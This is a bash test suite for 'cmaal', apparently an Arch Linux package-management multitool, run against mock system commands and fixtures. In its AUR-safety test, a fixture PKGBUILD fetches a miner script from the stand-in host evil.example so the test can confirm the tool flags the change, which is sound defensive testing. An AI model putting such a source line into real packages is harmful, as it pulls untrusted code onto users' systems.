#!/usr/bin/env bash
# cmaal test suite
#
# Runs every command against fake pacman / yay / flatpak / curl / systemctl
# (tests/mocks) and fixture data (tests/fixtures). Nothing touches the real
# system or the network, so it works on any Linux box and in CI.
#
#   make test            or   bash tests/run.sh [filter]

set -u

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
CMAAL="$ROOT/bin/cmaal"
FILTER=${1:-}
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

PASS=0 FAIL=0 SKIP=0
OUT="" RC=0
CUR=""

export PATH="$ROOT/tests/mocks:$PATH"
export MOCK_FIXTURES="$ROOT/tests/fixtures"
export NO_COLOR=1
unset DISPLAY WAYLAND_DISPLAY KITTY_WINDOW_ID XDG_CONFIG_HOME XDG_CACHE_HOME CMAAL_YES MOCK_FZF_PICK
export TERM=dumb

# A fresh fake system for every test
setup() {
    local t="$WORK/t"
    rm -rf "$t"
    mkdir -p "$t/home" "$t/cache" "$t/sync"
    cp "$MOCK_FIXTURES/pacman.log" "$MOCK_FIXTURES/pacman.conf" "$MOCK_FIXTURES/mirrorlist" "$t/"
    export HOME="$t/home"
    export MOCK_LOG="$t/log" MOCK_CACHE="$t/cache"
    export CMAAL_PACMAN_LOG="$t/pacman.log" CMAAL_PACMAN_CONF="$t/pacman.conf"
    export CMAAL_MIRRORLIST="$t/mirrorlist" CMAAL_PACMAN_LOCK="$t/db.lck" CMAAL_PACMAN_SYNC="$t/sync"
    # the installer must never look at the real /usr during tests
    export CMAAL_TEST_SYSROOT="$t/sysroot"
    unset MOCK_FZF_PICK MOCK_REMOTE_VERSION CMAAL_ASSUME_YES TERM_PROGRAM
    export TERM=dumb
    : >"$MOCK_LOG"
    T="$t"
}

run() {
    OUT=$("$CMAAL" "$@" 2>&1 </dev/null)
    RC=$?
}

# test "name": starts a test (skipped when it doesn't match the filter)
test_case() {
    CUR=$1
    [[ -z $FILTER || $CUR == *"$FILTER"* ]] || return 1
    setup
    return 0
}

pass() { PASS=$((PASS + 1)); printf '  \e[32mok\e[0m    %s: %s\n' "$CUR" "$1"; }
fail() {
    FAIL=$((FAIL + 1))
    printf '  \e[31mFAIL\e[0m  %s: %s\n' "$CUR" "$1"
    printf '%s\n' "$OUT" | head -n 25 | sed 's/^/          | /'
    [[ -s ${MOCK_LOG:-} ]] && sed 's/^/          log: /' "$MOCK_LOG" | head -n 15
}
skip() { SKIP=$((SKIP + 1)); printf '  \e[33mskip\e[0m  %s: %s\n' "$CUR" "$1"; }

out_has()    { if grep -qF -- "$1" <<<"$OUT"; then pass "output has '$1'"; else fail "output should have '$1'"; fi; }
out_lacks()  { if ! grep -qF -- "$1" <<<"$OUT"; then pass "output lacks '$1'"; else fail "output should not have '$1'"; fi; }
log_has()    { if grep -qF -- "$1" "$MOCK_LOG"; then pass "ran '$1'"; else fail "should have run '$1'"; fi; }
log_lacks()  { if ! grep -qF -- "$1" "$MOCK_LOG"; then pass "did not run '$1'"; else fail "should not have run '$1'"; fi; }
rc_is()      { if [[ $RC == "$1" ]]; then pass "exit code $1"; else fail "exit code should be $1, was $RC"; fi; }
file_has()   { if grep -qF -- "$2" "$1" 2>/dev/null; then pass "${1##*/} has '$2'"; else fail "${1##*/} should have '$2'"; fi; }
file_lacks() { if ! grep -qF -- "$2" "$1" 2>/dev/null; then pass "${1##*/} lacks '$2'"; else fail "${1##*/} should not have '$2'"; fi; }

printf 'cmaal test suite (%s)\n\n' "$ROOT"

# ---------------------------------------------------------------------------
# basics
# ---------------------------------------------------------------------------
if test_case "version"; then
    run --version
    out_has "cmaal v$(tr -d '[:space:]' <"$ROOT/VERSION") (git install)"
    rc_is 0
fi

if test_case "help"; then
    run --help
    out_has "PACKAGES"
    out_has "cmaal hold <pkg>"
    run help hold
    out_has "cmaal unhold"
    out_lacks "PACKAGES"
    run help zzzz
    rc_is 1
fi

if test_case "unknown command"; then
    run frobnicate
    rc_is 1
    out_has "unknown command: frobnicate"
fi

# ---------------------------------------------------------------------------
# install / search / upgrade
# ---------------------------------------------------------------------------
if test_case "-S routes each package to its source"; then
    run -S firefox visual-studio-code-bin spotify nosuchpkg --needed
    log_has "pacman -S --needed -- firefox"
    log_has "yay -S --needed -- visual-studio-code-bin"
    log_has "flatpak install --or-update flathub com.spotify.Client"
    out_has "not found nosuchpkg"
    rc_is 1
fi

if test_case "-S with nothing found"; then
    run -S nosuchpkg
    rc_is 1
    log_lacks "pacman -S "
fi

if test_case "-S picker"; then
    export MOCK_FZF_PICK='fish|GIMP'
    run -S
    log_has "pacman -S -- fish"
    log_has "flatpak install --or-update flathub org.gimp.GIMP"
fi

if test_case "-S picker cancelled"; then
    run -S
    out_has "nothing selected"
    log_lacks "pacman -S "
fi

if test_case "-Rns picker and passthrough"; then
    export MOCK_FZF_PICK='htop'
    run -Rns
    log_has "yay -Rns -- htop"
    : >"$MOCK_LOG"
    run -Rns git
    log_has "yay -Rns git"
fi

if test_case "-Ss searches everything"; then
    run -Ss spotify
    out_has "aur/spotify-launcher"
    out_has "com.spotify.Client"
    run -Ss firefox
    out_has "extra/firefox"
fi

if test_case "-Syu"; then
    run -Syu --noconfirm
    log_has "timeshift --create --comments cmaal: before upgrade --scripted"
    log_has "yay -Syu --noconfirm"
    log_has "flatpak update -y"
    file_has "$HOME/.cache/cmaal/news_seen" "Manual intervention & you"
fi

if test_case "-Syu shows unread news"; then
    mkdir -p "$HOME/.cache/cmaal"
    echo "Older news" >"$HOME/.cache/cmaal/news_seen"
    run -Syu --noconfirm
    out_has "Unread Arch news"
    out_has "Manual intervention & you"
    out_lacks "Older news"
fi

if test_case "-Syu without snapshot"; then
    mkdir -p "$HOME/.config/cmaal"
    echo 'SNAPSHOT_BEFORE_UPGRADE="no"' >"$HOME/.config/cmaal/config"
    run -Syu --noconfirm
    log_lacks "timeshift"
    log_has "yay -Syu"
fi

if test_case "updates"; then
    run updates
    out_has "htop 3.3.0-1 -> 3.3.1-1"
    out_has "yay-bin 12.3.5-1 -> 12.4.0-1"
    out_has "2 update(s) available"
    log_lacks "yay -Syu"
fi

# ---------------------------------------------------------------------------
# questions about packages
# ---------------------------------------------------------------------------
if test_case "why"; then
    run why libfoo
    out_has "as a dependency"
    out_has "Needed by:   firefox"
    run why firefox
    out_has "yourself"
    run why oldlib
    out_has "orphan"
    run why notinstalled
    out_has "not installed"
fi

if test_case "files"; then
    run files htop
    out_has "/usr/bin/htop"
    if ! grep -qx '/usr/bin/' <<<"$OUT"; then pass "directories are hidden"; else fail "directories should be hidden"; fi
    touch "$T/sync/extra.files"
    run files fish
    out_has "/usr/bin/fish"
fi

if test_case "provides"; then
    touch "$T/sync/extra.files"
    run provides htop
    out_has "extra/htop"
    out_has "cmaal -S htop"
    run provides nothere
    rc_is 1
fi

if test_case "provides without file db"; then
    run provides htop --noconfirm
    log_has "pacman -Fy"
fi

if test_case "pkgbuild"; then
    run pkgbuild spotify-launcher
    out_has "pkgname=spotify-launcher"
    out_has "aur.archlinux.org"
fi

if test_case "orphans"; then
    run orphans
    out_has "oldlib"
    out_has "cmaal orphans rm"
    run orphans rm --noconfirm
    log_has "pacman -Rns -- oldlib"
fi

# ---------------------------------------------------------------------------
# hold
# ---------------------------------------------------------------------------
if test_case "hold / unhold"; then
    run hold htop
    file_has "$T/pacman.conf" "IgnorePkg = htop"
    file_has "$T/pacman.conf" "#IgnorePkg   ="
    file_has "$T/pacman.conf.cmaal.bak" "[options]"
    run hold git htop
    file_has "$T/pacman.conf" "IgnorePkg = htop git"
    out_has "htop is already held"
    run holds
    out_has "htop"
    out_has "3.3.0-1"
    run unhold htop
    file_has "$T/pacman.conf" "IgnorePkg = git"
    file_lacks "$T/pacman.conf" "IgnorePkg = htop"
    run unhold git
    file_lacks "$T/pacman.conf" "IgnorePkg ="
    file_has "$T/pacman.conf" "[extra]"
    run unhold nope
    rc_is 1
fi

if test_case "hold keeps IgnorePkg in [options] only"; then
    run hold htop
    if awk '/^\[options\]/ { o = 1; next } /^\[/ { o = 0 } /^IgnorePkg/ { exit !o }' "$T/pacman.conf"; then
        pass "IgnorePkg is inside [options]"
    else
        fail "IgnorePkg ended up outside [options]"
    fi
fi

# ---------------------------------------------------------------------------
# rollback
# ---------------------------------------------------------------------------
if test_case "undo"; then
    touch "$MOCK_CACHE/htop-3.2.0-1-x86_64.pkg.tar.zst" "$MOCK_CACHE/oldthing-0.9-2-any.pkg.tar.zst"
    export CMAAL_ASSUME_YES=1
    run undo
    out_has "linux 6.10.1.arch1-1"
    log_has "pacman -U -- $MOCK_CACHE/htop-3.2.0-1-x86_64.pkg.tar.zst $MOCK_CACHE/oldthing-0.9-2-any.pkg.tar.zst"
    log_has "pacman -R -- newdep"
fi

if test_case "undo needs a yes"; then
    touch "$MOCK_CACHE/htop-3.2.0-1-x86_64.pkg.tar.zst"
    run undo --noconfirm
    rc_is 1
    log_lacks "pacman -U"
fi

if test_case "downgrade"; then
    touch "$MOCK_CACHE/htop-3.2.0-1-x86_64.pkg.tar.zst" "$MOCK_CACHE/htop-extra-9-1-x86_64.pkg.tar.zst"
    export MOCK_FZF_PICK='^3\.1\.0'
    run downgrade htop
    log_has "pacman -U -- https://archive.archlinux.org/packages/h/htop/htop-3.1.0-1-x86_64.pkg.tar.zst"
    : >"$MOCK_LOG"
    export MOCK_FZF_PICK='^3\.2\.0'
    run downgrade htop
    log_has "pacman -U -- $MOCK_CACHE/htop-3.2.0-1-x86_64.pkg.tar.zst"
    out_has "cmaal hold htop"
fi

if test_case "pkglist export / import"; then
    run pkglist export "$T/list.txt"
    file_has "$T/list.txt" "[pacman]"
    file_has "$T/list.txt" "yay-bin"
    file_has "$T/list.txt" "flathub com.spotify.Client"
    printf 'gonepkg\n' >>"$T/list.txt"
    sed -i 's/^\[aur\]$/gonepkg2\n[aur]/' "$T/list.txt"
    run pkglist import "$T/list.txt" --noconfirm
    log_has "pacman -S --needed --noconfirm -- firefox git htop linux"
    log_has "yay -S --needed --noconfirm -- yay-bin"
    out_has "no longer in the repos, skipping: gonepkg2"
fi

if test_case "snapshot"; then
    run snapshot create before gaming
    log_has "timeshift --create --comments before gaming --scripted"
fi

if test_case "history"; then
    run history 2
    out_has "installed newdep"
    out_has "removed oldthing"
fi

# ---------------------------------------------------------------------------
# system
# ---------------------------------------------------------------------------
if test_case "fix"; then
    touch "$T/db.lck"
    run fix --noconfirm
    if [[ ! -e $T/db.lck ]]; then pass "lock removed"; else fail "lock should be removed"; fi
    log_has "pacman -Sy --needed --noconfirm archlinux-keyring"
    log_lacks "pacman-key --init"
    out_has "first mirror is not responding: https://mirror.example/archlinux"
    log_has "reflector --latest 20"
    if [[ $(grep -c '^pacman -Syy' "$MOCK_LOG") == 1 ]]; then pass "databases refreshed once"; else fail "pacman -Syy should run once"; fi
fi

if test_case "clean"; then
    run clean --noconfirm
    log_has "pacman -Rns -- oldlib"
    log_has "journalctl --vacuum-time=2weeks"
fi

if test_case "services and logs"; then
    run services bluetooth restart
    log_has "systemctl restart -- bluetooth.service"
    run services --user pipewire enable
    log_has "systemctl --user enable --now -- pipewire.service"
    run logs nginx 20
    log_has "journalctl -b -u nginx.service -n 20 --no-pager"
    run logs prev
    log_has "journalctl -b -1 -p 3"
fi

if test_case "mirrors"; then
    run mirrors Germany --noconfirm
    log_has "reflector --latest 20 --protocol https --sort rate --save $T/mirrorlist --country Germany"
    file_has "$T/mirrorlist.bak" "mirror.example"
fi

if test_case "sys, fetch, kernel, disk"; then
    run sys
    out_has "AUR helper  yay"
    rc_is 0
    run fetch
    out_has "OS:"
    run kernel
    out_has "running:"
    run disk
    out_has "Filesystems"
    rc_is 0
fi

# ---------------------------------------------------------------------------
# ssh
# ---------------------------------------------------------------------------
if test_case "ssh add / rm"; then
    run ssh add pi pi@192.168.1.50:2222 --noconfirm
    file_has "$HOME/.ssh/config" "Host pi"
    file_has "$HOME/.ssh/config" "HostName 192.168.1.50"
    file_has "$HOME/.ssh/config" "Port 2222"
    file_lacks "$HOME/.ssh/config" "--noconfirm"
    run ssh add pi x@y
    rc_is 1
    run ssh rm pi
    file_lacks "$HOME/.ssh/config" "Host pi"
fi

if test_case "ssh in kitty"; then
    export TERM=xterm-kitty KITTY_WINDOW_ID=1
    run ssh pi
    log_has "kitten ssh pi"
    run ssh -t pi
    log_has "kitten @ launch --type=tab --tab-title pi kitten ssh pi"
    unset KITTY_WINDOW_ID
fi

# ---------------------------------------------------------------------------
# cmaal itself
# ---------------------------------------------------------------------------
if test_case "config and whatsnew"; then
    run config reset
    if cmp -s "$ROOT/share/config.default" "$HOME/.config/cmaal/config"; then pass "config reset copies the defaults"; else fail "config differs from defaults"; fi
    run whatsnew
    out_has "What's new in cmaal v$(tr -d '[:space:]' <"$ROOT/VERSION")"
    out_lacks "**"
    run whatsnew 9.9.9
    rc_is 1
fi

if test_case "update notice"; then
    mkdir -p "$HOME/.cache/cmaal"
    echo 9.9.9 >"$HOME/.cache/cmaal/remote_version"
    run --version
    out_has "update available: v9.9.9"
    MOCK_REMOTE_VERSION=$(tr -d "[:space:]" <"$ROOT/VERSION")
    export MOCK_REMOTE_VERSION
    run self-update
    out_has "cmaal is up to date"
fi

# ---------------------------------------------------------------------------
# 1.0: plugins
# ---------------------------------------------------------------------------
if test_case "plugins"; then
    run plugins
    out_has "No plugins yet"
    run plugins new hello-world
    file_has "$HOME/.config/cmaal/plugins/hello-world.sh" "plugin_hello_world()"
    run hello-world one two
    out_has "You passed: one two"
    run plugins
    out_has "hello-world"
    run help
    out_has "PLUGINS"
    run plugins new wifi
    rc_is 1
    out_has "already a cmaal command"
    run plugins new Bad_Name
    rc_is 1
fi

if test_case "plugins: broken plugin and hooks"; then
    mkdir -p "$HOME/.config/cmaal/plugins"
    echo 'this is ( not bash' >"$HOME/.config/cmaal/plugins/broken.sh"
    cat >"$HOME/.config/cmaal/plugins/after.sh" <<'EOP'
PLUGIN_DESC="says hi after upgrades"
plugin_after() { echo "after ran"; }
after_hook() { echo "HOOK: upgrade finished"; }
cmaal_on post_upgrade after_hook
EOP
    run --version
    out_has "skipping plugin"
    rc_is 0
    run -Syu --noconfirm
    out_has "HOOK: upgrade finished"
    run nosuchcmd
    rc_is 1
fi

# ---------------------------------------------------------------------------
# 1.0: German
# ---------------------------------------------------------------------------
if test_case "german"; then
    OUT=$(LANG=de_AT.UTF-8 "$CMAAL" help 2>&1)
    out_has "PAKETE"
    out_has "ein Multitool für Arch Linux"
    OUT=$(LANG=de_AT.UTF-8 "$CMAAL" -S nosuchpkg 2>&1 </dev/null)
    out_has "Suche 1 Paket(e)..."
    out_has "nicht gefunden"
    OUT=$(LANG=de_AT.UTF-8 "$CMAAL" kaputt 2>&1)
    out_has "unbekannter Befehl: kaputt"
    mkdir -p "$HOME/.config/cmaal"
    echo 'LANGUAGE_UI="en"' >"$HOME/.config/cmaal/config"
    OUT=$(LANG=de_AT.UTF-8 "$CMAAL" kaputt 2>&1)
    out_has "unknown command: kaputt"
    OUT=$(LANG=en_US.UTF-8 "$CMAAL" help 2>&1)
    out_has "PACKAGES"
fi

if test_case "german catalog is sane"; then
    bad=$(awk -F'\t' '!/^#/ && NF && NF != 2' "$ROOT/share/i18n/de.txt")
    if [[ -z $bad ]]; then pass "every line is English<TAB>German"; else OUT=$bad; fail "malformed lines"; fi
    bad=$(awk -F'\t' '!/^#/ && NF == 2 { a = gsub(/%s/, "", $1); b = gsub(/%s/, "", $2); if (a != b) print }' "$ROOT/share/i18n/de.txt")
    if [[ -z $bad ]]; then pass "placeholders match"; else OUT=$bad; fail "placeholder count differs"; fi
fi

# ---------------------------------------------------------------------------
# 1.0: AUR safety
# ---------------------------------------------------------------------------
if test_case "review cards"; then
    run review spotify-launcher --noconfirm
    out_has "maintainer: none"
    out_has "orphaned"
    out_has "flagged out of date 30 days ago"
    run review fresh-miner --noconfirm
    out_has "brand new with almost no votes"
    run review visual-studio-code-bin --noconfirm
    out_lacks "!"
    run review notonaur --noconfirm
    rc_is 1
fi

if test_case "review: all installed AUR packages"; then
    run review
    out_has "spotify-launcher"
    out_has "orphaned (no maintainer)"
    out_has "ghostpkg"
    out_has "not in the AUR anymore"
    out_lacks "yay-bin "
fi

if test_case "AUR install check and PKGBUILD changes"; then
    run -S fresh-miner --noconfirm
    out_has "AUR check"
    out_has "brand new"
    log_has "yay -S --noconfirm -- fresh-miner"
    file_has "$HOME/.cache/cmaal/pkgbuilds/fresh-miner.PKGBUILD" "fresh-miner.tar.gz"
    # the AUR PKGBUILD changes: cmaal should notice
    mkdir -p "$T/pkgbuilds"
    printf 'pkgname=fresh-miner\npkgver=2.0\nsource=(https://evil.example/miner.sh)\n' >"$T/pkgbuilds/fresh-miner"
    export MOCK_PKGBUILDS="$T/pkgbuilds"
    cp "$HOME/.cache/cmaal/pkgbuilds/fresh-miner.PKGBUILD" "$T/installed.PKGBUILD"
    run review fresh-miner --noconfirm
    out_has "What changed since you installed it"
    out_has "+source=(https://evil.example/miner.sh)"
    # review marked it as seen; put the old one back to test the install warning
    cp "$T/installed.PKGBUILD" "$HOME/.cache/cmaal/pkgbuilds/fresh-miner.PKGBUILD"
    run -S fresh-miner --noconfirm
    out_has "PKGBUILD changed since you last installed it"
    unset MOCK_PKGBUILDS
fi

if test_case "AUR check can be turned off"; then
    mkdir -p "$HOME/.config/cmaal"
    echo 'AUR_CHECK="no"' >"$HOME/.config/cmaal/config"
    run -S fresh-miner --noconfirm
    out_lacks "AUR check"
    log_has "yay -S --noconfirm -- fresh-miner"
fi

# ---------------------------------------------------------------------------
# 1.0: alerts
# ---------------------------------------------------------------------------
if test_case "alerts"; then
    mkdir -p "$HOME/.cache/cmaal"
    echo "Older news" >"$HOME/.cache/cmaal/news_seen"
    run alerts now
    out_has "2 updates (1 AUR)"
    out_has "1 unread Arch news"
    run alerts on
    file_has "$HOME/.config/systemd/user/cmaal-alerts.timer" "OnUnitActiveSec=6h"
    file_has "$HOME/.config/systemd/user/cmaal-alerts.service" "__alert-check"
    log_has "systemctl --user enable --now cmaal-alerts.timer"
    : >"$MOCK_LOG"
    run __alert-check
    run __alert-check
    if [[ $(grep -c '^notify-send' "$MOCK_LOG") == 0 ]]; then pass "no repeat notification for the same news"; else fail "notified twice"; fi
    rm -f "$HOME/.cache/cmaal/alerts_notified"
    run __alert-check
    log_has "notify-send --app-name=cmaal"
    run alerts off
    if [[ ! -e $HOME/.config/systemd/user/cmaal-alerts.timer ]]; then pass "timer removed"; else fail "timer still there"; fi
fi

# ---------------------------------------------------------------------------
# 1.0: desktop
# ---------------------------------------------------------------------------
if test_case "wifi"; then
    run wifi list
    out_has "Cafe:Guest"
    out_has "HomeNet"
    if [[ $(grep -c HomeNet <<<"$OUT") == 1 ]]; then pass "duplicate networks merged"; else fail "HomeNet listed twice"; fi
    export MOCK_FZF_PICK='Cafe'
    run wifi
    log_has "nmcli --ask dev wifi connect Cafe:Guest"
    run wifi connect Neighbor
    log_has "nmcli --ask dev wifi connect Neighbor"
    run wifi share
    out_has "hunter22"
    run wifi off
    log_has "nmcli radio wifi off"
fi

if test_case "bluetooth"; then
    run bluetooth
    out_has "WH-1000XM4"
    out_has "connected"
    out_has "MX Keys"
    export MOCK_FZF_PICK='MX Keys'
    run bluetooth connect
    log_has "bluetoothctl connect AA:BB:CC:DD:EE:02"
    export MOCK_FZF_PICK='New Speaker'
    run bluetooth pair
    log_has "bluetoothctl pair AA:BB:CC:DD:EE:03"
    log_has "bluetoothctl trust AA:BB:CC:DD:EE:03"
fi

if test_case "drivers"; then
    run drivers --noconfirm
    out_has "AMD"
    out_has "missing: mesa vulkan-radeon"
    out_has "Intel SOF"
    log_has "pacman -S --needed --"
    log_has "vulkan-radeon"
fi

if test_case "gaming"; then
    run gaming --noconfirm
    file_has "$T/pacman.conf" "[multilib]"
    file_has "$T/pacman.conf.cmaal.bak" "#[multilib]"
    log_has "pacman -Syu"
    log_has "pacman -S --needed -- steam gamemode lib32-gamemode mangohud lib32-mangohud lib32-mesa vulkan-radeon lib32-vulkan-radeon"
    log_lacks "lutris"
    run gaming --noconfirm
    out_has "multilib is enabled"
fi

# ---------------------------------------------------------------------------
# 1.0: rescue and backup
# ---------------------------------------------------------------------------
if test_case "rescue on the running system"; then
    touch "$T/db.lck"
    export MOCK_FZF_PICK='stuck pacman lock'
    run rescue --noconfirm
    if [[ ! -e $T/db.lck ]]; then pass "removed the (sandboxed) lock"; else fail "lock still there"; fi
    log_lacks "/var/lib/pacman/db.lck"
fi

if test_case "rescue from the USB stick"; then
    mkdir -p "$T/mnt/etc"
    echo "UUID=abc / ext4 defaults 0 1" >"$T/mnt/etc/fstab"
    export CMAAL_FORCE_LIVE=1 CMAAL_RESCUE_MNT="$T/mnt" MOCK_MOUNTED="$T/mnt" MOCK_FZF_PICK='kernel'
    run rescue --noconfirm
    out_has "already mounted"
    log_has "arch-chroot $T/mnt pacman -S --noconfirm linux"
    log_has "arch-chroot $T/mnt mkinitcpio -P"
    log_has "umount -R $T/mnt"
    unset CMAAL_FORCE_LIVE CMAAL_RESCUE_MNT MOCK_MOUNTED
fi

if test_case "backup"; then
    if command -v git >/dev/null; then
        mkdir -p "$HOME/.config/kitty" "$HOME/.ssh"
        echo "font_size 12" >"$HOME/.config/kitty/kitty.conf"
        echo "PRIVATE KEY" >"$HOME/.ssh/id_ed25519"
        echo "Host pi" >"$HOME/.ssh/config"
        echo "tok" >"$HOME/.config/kitty/api_token"
        run backup
        rc_is 1
        run backup init
        run backup
        out_has "backup saved"
        repo="$HOME/.local/share/cmaal/backup"
        file_has "$repo/home/.config/kitty/kitty.conf" "font_size 12"
        file_has "$repo/home/.ssh/config" "Host pi"
        if ! grep -rq "PRIVATE KEY" "$repo"; then pass "private key never copied"; else fail "PRIVATE KEY LEAKED INTO BACKUP"; fi
        if [[ ! -e $repo/home/.config/kitty/api_token ]]; then pass "token file skipped"; else fail "token file copied"; fi
        run backup
        out_has "nothing changed"
        run backup add "$HOME/.ssh"
        rc_is 1
        echo "font_size 99" >"$HOME/.config/kitty/kitty.conf"
        export CMAAL_ASSUME_YES=1
        run backup restore kitty
        file_has "$HOME/.config/kitty/kitty.conf" "font_size 12"
        file_has "$HOME/.config/kitty/kitty.conf.cmaal-old" "font_size 99"
    else
        skip "git not installed"
    fi
fi

# ---------------------------------------------------------------------------
# packaging
# ---------------------------------------------------------------------------
if test_case "make install"; then
    if have_make=$(command -v make); then
        make -s -C "$ROOT" install DESTDIR="$T/root" PREFIX=/usr >/dev/null
        for f in usr/bin/cmaal usr/lib/cmaal/core.sh usr/share/cmaal/config.default usr/share/cmaal/CHANGELOG.md usr/share/cmaal/i18n/de.txt usr/share/cmaal/i18n/help.de.txt usr/share/man/man1/cmaal.1 \
                 usr/share/doc/cmaal/CHANGELOG.md usr/share/bash-completion/completions/cmaal \
                 usr/share/zsh/site-functions/_cmaal usr/share/fish/vendor_completions.d/cmaal.fish \
                 usr/share/licenses/cmaal/LICENSE; do
            if [[ -f $T/root/$f ]]; then pass "installs /$f"; else fail "missing /$f"; fi
        done
        file_has "$T/root/usr/bin/cmaal" "CMAAL_PREFIX=\"/usr\""
        file_lacks "$T/root/usr/share/man/man1/cmaal.1" "@VERSION@"

        make -s -C "$ROOT" install PREFIX="$T/prefix" >/dev/null
        OUT=$("$T/prefix/bin/cmaal" --version 2>&1)
        out_has "(manual install)"
        OUT=$(LANG=de_AT.UTF-8 "$T/prefix/bin/cmaal" help 2>&1)
        out_has "PAKETE"
        OUT=$("$T/prefix/bin/cmaal" whatsnew 2>&1)
        out_has "What's new"
        # docs can be skipped by pacman's NoExtract, whatsnew must not care
        rm -rf "$T/prefix/share/doc"
        OUT=$("$T/prefix/bin/cmaal" whatsnew 2>&1)
        out_has "What's new"
    else
        skip "make not installed"
    fi
fi

if test_case "install.sh --user"; then
    if command -v make >/dev/null; then
        OUT=$(bash "$ROOT/install.sh" --user --yes 2>&1 </dev/null)
        RC=$?
        rc_is 0
        OUT=$("$HOME/.local/bin/cmaal" --version 2>&1)
        out_has "(manual install)"
        OUT=$(bash "$ROOT/install.sh" --uninstall --yes 2>&1 </dev/null)
        if [[ ! -e $HOME/.local/bin/cmaal ]]; then pass "uninstall removed it"; else fail "uninstall left ~/.local/bin/cmaal"; fi
    else
        skip "make not installed"
    fi
fi

if test_case "install.sh package mode"; then
    if (( EUID == 0 )); then
        skip "makepkg refuses root, run as a normal user"
    else
        mkdir -p "$HOME/.local/bin"
        printf '#!/bin/bash\nCMAAL_VERSION="0.2.0"\n' >"$HOME/.local/bin/cmaal"
        # an old 0.2 system install: binary in /usr/local, completion in /usr/share
        mkdir -p "$T/sysroot/usr/local/bin" "$T/sysroot/usr/share/bash-completion/completions"
        echo old >"$T/sysroot/usr/local/bin/cmaal"
        echo old >"$T/sysroot/usr/share/bash-completion/completions/cmaal"
        export MOCK_MAKEPKG_FAIL=1
        OUT=$(bash "$ROOT/install.sh" --yes 2>&1 </dev/null)
        out_has "nothing was changed"
        if [[ -e $HOME/.local/bin/cmaal ]]; then pass "failed build keeps the old copy"; else fail "failed build removed the old copy"; fi
        unset MOCK_MAKEPKG_FAIL
        OUT=$(bash "$ROOT/install.sh" --yes 2>&1 </dev/null)
        log_has "makepkg -s --clean --force --noconfirm"
        log_has "makepkg-source cmaal::git+file://$ROOT#"
        log_has "pacman -U --noconfirm --"
        if [[ ! -e $HOME/.local/bin/cmaal ]]; then pass "old ~/.local/bin/cmaal removed"; else fail "old copy still there"; fi
        if [[ ! -e $T/sysroot/usr/local/bin/cmaal ]]; then pass "old /usr/local/bin/cmaal removed"; else fail "old /usr/local copy still there"; fi
        if [[ ! -e $T/sysroot/usr/share/bash-completion/completions/cmaal ]]; then pass "old completion removed"; else fail "old completion still there"; fi
        if ! grep -q ' /usr/' "$MOCK_LOG"; then pass "never touched the real /usr"; else fail "touched the real /usr"; fi
    fi
fi

if test_case "0.2.0 self-update moves to the package"; then
    # the real 0.2.0 script, installed the old way, updating itself
    mkdir -p "$T/usr-local-bin"
    cp "$MOCK_FIXTURES/cmaal-0.2.0" "$T/usr-local-bin/cmaal"
    MOCK_REMOTE_VERSION=$(tr -d "[:space:]" <"$ROOT/VERSION")
    export MOCK_REMOTE_VERSION MOCK_REPO="$ROOT"
    OUT=$("$T/usr-local-bin/cmaal" self-update 2>&1 </dev/null)
    out_has "updated cmaal v0.2.0 -> v$MOCK_REMOTE_VERSION"
    file_has "$T/usr-local-bin/cmaal" "cmaal legacy updater"
    # next run hands over to the installer (here: no terminal, so it explains)
    OUT=$("$T/usr-local-bin/cmaal" --version 2>&1 </dev/null)
    RC=$?
    out_has "proper pacman package"
    out_has "install.sh | bash"
    rc_is 1
fi

if test_case "legacy updater"; then
    if bash -n "$ROOT/cmaal"; then pass "parses"; else fail "syntax error"; fi
    file_has "$ROOT/cmaal" "CMAAL_VERSION=\"$(tr -d '[:space:]' <"$ROOT/VERSION")\""
fi

printf '\n%d passed, %d failed, %d skipped\n' "$PASS" "$FAIL" "$SKIP"
(( FAIL == 0 ))
